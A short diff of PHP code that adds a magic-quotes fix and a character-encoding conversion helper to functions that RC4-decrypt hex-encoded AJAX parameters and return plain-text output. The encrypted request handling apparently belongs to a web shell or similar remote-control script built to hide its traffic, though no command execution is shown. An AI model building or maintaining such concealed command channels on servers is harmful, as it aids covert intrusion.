@@ -79,6 +79,7 @@ if(!function_exists('get_post')){
 		if(empty($_FILES) && is_ajax()) {
 			$post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['target']));
 			parse_str($post_str, $post);
+			$post = fix_magic_quote($post);
 		}	
 		return $post;
 	}
@@ -992,8 +993,21 @@ if(!function_exists('output')){
 		header("Content-Type: text/plain");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		echo $str;
+		echo isset($GLOBALS['encode']) ? convert_encode($GLOBALS['encode'], 'utf-8', $str) : $str;
 		die();
+	}
+}
+
+if(!function_exists('convert_encode')) {
+	function convert_encode($from, $to, $txt)
+	{
+		$ret = false;
+		if(function_exists("iconv")) {
+			$ret = @iconv($from, $to, $txt);
+		} elseif(function_exists('mb_convert_encoding')) {
+			$ret = @mb_convert_encoding($txt, $to, $from);
+		}
+		return $ret === false ? $txt : $ret;
 	}
 }
 
@@ -1004,7 +1018,6 @@ if ( !function_exists( 'hex2bin' ) ) {
         for ( $i = 0; $i < $len; $i += 2 ) {
             $sbin .= pack( "H*", substr( $str, $i, 2 ) );
         }
-
         return $sbin;
     }
 }
